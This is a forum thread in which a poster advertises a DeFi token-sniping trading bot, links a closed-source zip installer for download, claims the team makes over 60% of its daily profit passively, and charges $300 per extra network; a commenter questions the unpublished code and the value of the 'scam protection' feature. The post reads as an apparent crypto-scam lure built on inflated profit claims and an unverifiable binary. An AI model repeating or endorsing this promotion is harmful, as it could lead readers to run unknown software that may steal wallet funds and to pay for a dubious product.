title: DEFI-NEO|OFFICIAL
author: DEFI-NEO|OFFICIAL
content: Hello, my friend, are you trading in the defi segment of the market?We do too!So tell me, have you ever wanted to automate the process of trading and sniping new tokens?We can give you this opportunity!A unique trading bot with support for all networks, and the main advantage is - we give you an opportunity to test our bot on the Binance Smart Chain (BSC) network FREE of charge.Try the bot right now for free on the BSC chain, if you like it, then buy the addition of other new networks and get maximum profithttps://github.com/DEFI-NEO/instaler/releases/download/4.0/Installer_Bot.zipWhat can this bot do?1) Instant trading. When you trade manually through trust wallet or metamask wallets, you spend 20 to 60 seconds on the token verification and transaction confirmation processes. With our bot, the processes of selling and buying is instant, because they go directly to the network of the validator.2) Scam protection. Have you ever bought a token that lost its value after a while? This is not a problem with our bot - add the contract address of the token to the bot to track a rapid sale or liquidity withdrawal. If the price drops by more than 20%-(the rate is adjustable), our bot will automatically sell this token.3) You can snipe contract addresses from Telegram channels and Discord servers as well. Add a link to the channel in our bot and select the time peiod from which you want to collect information. Everyone will find their own application for this feature, but originally it was designed to monitor airdrops.4) You can also snipe popular tokens from the hot pairs of websites like Dextools and Pinksale. With this feature alone, our team passively makes more than 60% of its daily profit.5) Support for all networks, connecting each additional network will cost 300$, just add "RPC Server Address" and "chain id".Supports: Includes Pancakeswap (BSC), QuickSwap, SushiSwap, CafeSwap, Vulcan DEX (POLYGON), Trader Joe, Pangolin, Baguette (AVALANCHE), SpookySwap, SpiritSwap, WingSwap, FanSwap (FANTOM), KuSwap, KoffeeSwap (KCC), WagyuSwap (VELAS), LuaSwap (TOMOCHAIN), ViperSwap (HARMONY), CronaSwap, VVS Finance, Swapp Protocol, CrowFi, CroDex, MM Finance (CRONOS), Solarbeam (MOONRIVER), MIMO, ZoomSwap (IoTeX), UbeSwap, SushiSwap (CELO), MDEX (HECO), WannaSwap, Trisolaris (AURORA), CherrySwap, KSwap, JSwap (OEC), YuzuSwap (OASIS), Solarbeam, StellaSwap, BeamSwap (MOONBEAM), SushiSwap (ARBITRUM), NetSwap, Tethys (METIS), KaiDex (KARDIACHAIN), Voltage (FUSE), Zappy (TELOS) MilkySwap, MuesliSwap (MILKOMEDA), Diffusion, Cronus, EvmoSwap (EVMOS), Any DEX (PULSECHAIN)We add new features weekly and optimize the bot for convenient operation. The most important thing is that we have a friendly community, each bot user can be added to our private chat on telegram for free, there we share our new unique trading strategies and monitor the development of new Defi networks. We reduce spam and focus on working trading schemes.My YT https://www.youtube.com/channel/UCtg4Wq4Jo_9O0OMEXJo0ybw

comments.author: Husires
comments.body: Quote from: DEFI-NEO|OFFICIAL on November 25, 2023, 02:46:21 AMTry the bot right now for free on the BSC chain, if you like it, then buy the addition of other new networks and get maximum profithttps://github.com/DEFI-NEO/instaler/releases/download/4.0/Installer_Bot.zipWhy publish the code in a zip file format? This code is not open source. If you do not plan to make it open source, do not upload the code to github.com. The code size is larger than the average code sizes for these bots, but without publishing the code we will not be able to know what is happening.Quote from: DEFI-NEO|OFFICIAL on November 25, 2023, 02:46:21 AM2) Scam protection. Have you ever bought a token that lost its value after a while? This is not a problem with our bot - add the contract address of the token to the bot to track a rapid sale or liquidity withdrawal. If the price drops by more than 20%-(the rate is adjustable), our bot will automatically sell this token.It will not help much, as when the coin start scaming, the sell orders will be executed en masse, and even if you place a sell order, it will be lifted due to lack of liquidity.This chart is an example of a scam. If you notice, the collapse curve continues, making a sell order impossible.

comments.author: DEFI-NEO|OFFICIAL
comments.body: Quote from: Husires on November 25, 2023, 04:17:38 AMQuote from: DEFI-NEO|OFFICIAL on November 25, 2023, 02:46:21 AMTry the bot right now for free on the BSC chain, if you like it, then buy the addition of other new networks and get maximum profithttps://github.com/DEFI-NEO/instaler/releases/download/4.0/Installer_Bot.zipWhy publish the code in a zip file format? This code is not open source. If you do not plan to make it open source, do not upload the code to github.com. The code size is larger than the average code sizes for these bots, but without publishing the code we will not be able to know what is happening.Quote from: DEFI-NEO|OFFICIAL on November 25, 2023, 02:46:21 AM2) Scam protection. Have you ever bought a token that lost its value after a while? This is not a problem with our bot - add the contract address of the token to the bot to track a rapid sale or liquidity withdrawal. If the price drops by more than 20%-(the rate is adjustable), our bot will automatically sell this token.It will not help much, as when the coin start scaming, the sell orders will be executed en masse, and even if you place a sell order, it will be lifted due to lack of liquidity.This chart is an example of a scam. If you notice, the collapse curve continues, making a sell order impossible.Regarding the size, I did not understand your comment, some similar programs weigh from 100 megabytes. The idea of “anti-scam” is when a holder sells a large price of a token, thereby collapsing the rate by more than 10-20%, most often this factor causes a massive "exit-scam", I’m not saying that this function protects you 100%, but to say that this function is useless it is reckless
